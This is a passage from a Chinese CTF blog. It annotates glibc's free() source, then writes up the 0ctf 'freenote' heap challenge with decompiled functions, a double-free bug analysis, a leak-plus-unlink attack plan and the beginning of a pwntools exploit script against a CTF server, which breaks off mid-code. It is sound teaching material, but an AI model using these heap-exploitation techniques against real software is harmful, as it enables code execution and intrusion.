class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we're single-threaded, don't lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">"double free or corruption (top)"</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (<span class="string">"double free or corruption (out)"</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">"free(): invalid next size (normal)"</span>);</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//前向合并,一般的unlink打法</span></span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//不相邻topchunk且前向chunk inuse.</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//获取free chunk的next chunk的next chunk的inuse位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果为0,前向合并nextchunk</span></span><br><span class="line">	unlink_chunk (av, nextchunk);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//否则clear next next inuse位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av); <span class="comment">//插入unsorted bin</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	malloc_printerr (<span class="string">"free(): corrupted unsorted chunks"</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">//合并到topchunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don't know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don't want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">	    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">	  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这部分就是两个最重要的unlink发生的地方了.分别是向前合并和后向合并,分别检测prev inuse或者next next prev_inuse两处unlink,注意全是向低地址合并,然后插入到unsorted bin中</li>
<li>否则next位top则归入topchunk.</li>
</ul>
<h2 id="io部分"><a href="#io部分" class="headerlink" title="io部分"></a>io部分</h2><ul>
<li>挖坑待填</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/malloc源码精读总结/" data-id="cjyn83qg3003hicthocar3p1x" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-level6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/level6/" class="article-date">
  <time datetime="2019-07-28T17:11:01.707Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PWN/">PWN</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/level6/">0ctf - freenote</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="整理结构体"><a href="#整理结构体" class="headerlink" title="整理结构体"></a>整理结构体</h1><ul>
<li>程序首先初始化了了chunklist,此题的chunklist是在堆里面分配的</li>
<li>一个指针指向了malloc(0x1810)的头,此段空间的前16字节分别是最大堆块的值和当前堆块数量</li>
<li>大概结构体如下图</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> headptr         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1810</span>, align=<span class="number">0x8</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> max             dq ?</span><br><span class="line"><span class="number">00000008</span> count           dq ?</span><br><span class="line"><span class="number">00000010</span> nodelist        note <span class="number">256</span> dup(?)</span><br><span class="line"><span class="number">00001810</span> headptr         ends</span><br><span class="line"><span class="number">00001810</span></span><br></pre></td></tr></table></figure>

<ul>
<li>note结构体如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: headptr/r</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> data            dq ?</span><br><span class="line"><span class="number">00000018</span> note            ends</span><br><span class="line"><span class="number">00000018</span></span><br></pre></td></tr></table></figure>

<ul>
<li>经过整理以后,可以看出来程序一开始初始化了256个note结构体,指针置空</li>
</ul>
<h1 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h1><h2 id="new函数"><a href="#new函数" class="headerlink" title="new函数"></a>new函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt; head-&gt;max )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !head-&gt;nodelist[i].inuse )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Length of new note: "</span>);</span><br><span class="line">        size = retint();</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &gt; <span class="number">4096</span> )</span><br><span class="line">            size = <span class="number">4096</span>;</span><br><span class="line">          buf = <span class="built_in">malloc</span>((<span class="number">128</span> - size % <span class="number">128</span>) size);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Enter your note: "</span>);</span><br><span class="line">          mread1(buf, size);</span><br><span class="line">          head-&gt;nodelist[i].inuse = <span class="number">1L</span>L;</span><br><span class="line">          head-&gt;nodelist[i].size = size;</span><br><span class="line">          head-&gt;nodelist[i].data = buf;</span><br><span class="line">          ++head-&gt;count;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Invalid length!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Unable to create new note."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>整理过结构体以后,程序逻辑就很清晰了,new函数是从前到后遍历chunklist,当inuse为0的时候,在那个堆块malloc了note的空间,注意的是,size是不可任意malloc的,因为设置了自动对齐的运算,size大小只能是128*n (n &gt; 0)</li>
<li>这就导致了我们无法直接申请fastbin</li>
<li>还有程序自己实现了read函数,输入size后必须输入满足你的size才能结束输入循环</li>
</ul>
<h2 id="list函数"><a href="#list函数" class="headerlink" title="list函数"></a>list函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You need to create some new notes first."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( head-&gt;nodelist[i].inuse == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d. %s\n"</span>, i, head-&gt;nodelist[i].data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>打印当前所有inuse为1的堆块</li>
</ul>
<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  headptr *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Note number: "</span>);</span><br><span class="line">  v3 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= head-&gt;max || head-&gt;nodelist[v3].inuse != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Length of note: "</span>);</span><br><span class="line">  v2 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid length!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != head-&gt;nodelist[v3].size )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = head;</span><br><span class="line">    v1-&gt;nodelist[v3].data = <span class="built_in">realloc</span>(head-&gt;nodelist[v3].data, (<span class="number">128</span> - v2 % <span class="number">128</span>) v2);<span class="comment">// 0 128 256</span></span><br><span class="line">    head-&gt;nodelist[v3].size = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your note: "</span>);</span><br><span class="line">  mread1(head-&gt;nodelist[v3].data, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个edit函数并没有限制编辑的次数,而且要注意的是,当size不一样的时候,程序会调用realloc函数</li>
</ul>
<h2 id="del函数"><a href="#del函数" class="headerlink" title="del函数"></a>del函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No notes yet."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Note number: "</span>);</span><br><span class="line">  v1 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= head-&gt;max )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">  --head-&gt;count;</span><br><span class="line">  head-&gt;nodelist[v1].inuse = <span class="number">0L</span>L;               <span class="comment">// 未check是否inuse 任意次数free</span></span><br><span class="line">  head-&gt;nodelist[v1].size = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">free</span>(head-&gt;nodelist[v1].data);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>最短的函数之一,也是漏洞点的所在</li>
<li>程序并没有check堆块是否inuse,而且free后指针没有置空,所以就导致了我们可以通过double free来进行攻击</li>
</ul>
<h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><ul>
<li>要进行攻击,必须获得程序中的一些基址,也就是在程序真正运行时的一些偏移,这里可以采用unsorted bin leak来leaklibc的基址,同样我们利用free后再次malloc,也可以获得上次相同的堆块,随后我们可以利用形成的双链表的fd bk来获取libc和heap的基址</li>
<li>由于程序中并没有溢出的存在,又不能生成fastbin,这里考虑从堆块错位下手,然后利用未置空的指针来进行double free</li>
<li>具体过程是先leak堆和libc的基址,然后全部free后,malloc4块空间依次free,随后申请一个大的堆块,正好包含起来所有的小堆块,构造unlink后随后free之前修改过的指针的已free堆块,控制指针,随后getshell</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><ul>
<li>首先add四个堆块,然后依次free index为0和2的堆块,0处就会出现main_arena的真实地址,我们获得了libc基址,2处因为无法合并就会出现双向链表,同样泄露了heap的地址</li>
<li>全部free后,利用堆块错位和double free构造unlink</li>
<li>三次malloc(128)以后内存依次free后内存中应该是下面的样子</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-----+--------------------</span><br><span class="line">0x00 | head   size</span><br><span class="line">0x10 | data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x80 | data   data</span><br><span class="line">-----+--------------------</span><br><span class="line">0x90 | head   size</span><br><span class="line">0xa0 | data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x110| data   data</span><br><span class="line">-----+--------------------</span><br><span class="line">0x120| head   size</span><br><span class="line">0x130| data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x1a0| data   data</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<ul>
<li>之后编辑堆块构造unlink</li>
<li>放出完整exp</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9886</span>)</span><br><span class="line"><span class="comment"># r = process("./freenote_x64",env=&#123;'LD_PRELOAD':'./libc-2.19.so'&#125;)</span></span><br><span class="line">got_atoi = <span class="number">0x602070</span></span><br><span class="line">libc_mainarena = <span class="number">0x3BE760</span></span><br><span class="line">libc_system = <span class="number">0x46590</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"new note: "</span>,str(len(text)))</span><br><span class="line">    r.sendafter(<span class="string">"your note: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Note number: "</span>,str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">"Length of note: "</span>,str(len(text)))</span><br><span class="line">    r.sendafter(<span class="string">"your note: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span 